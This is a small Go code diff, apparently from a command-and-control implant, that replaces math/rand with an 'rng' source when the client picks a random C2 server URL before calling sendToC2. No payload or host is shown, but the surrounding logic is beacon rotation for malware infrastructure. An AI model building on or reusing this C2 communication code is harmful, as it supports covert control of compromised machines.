@@ -5,7 +5,6 @@ package main
 
 import (
 	"fmt"
-	mathRand "math/rand"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -53,7 +52,7 @@ func sendWithMode(body []byte) []byte {
 		return nil
 
 	case C2ModeRandom:
-		idx := mathRand.Intn(len(urls))
+		idx := rng.Intn(len(urls))
 		currentC2Idx.Store(int32(idx))
 		resp := sendToC2(idx, body)
 		if resp != nil {
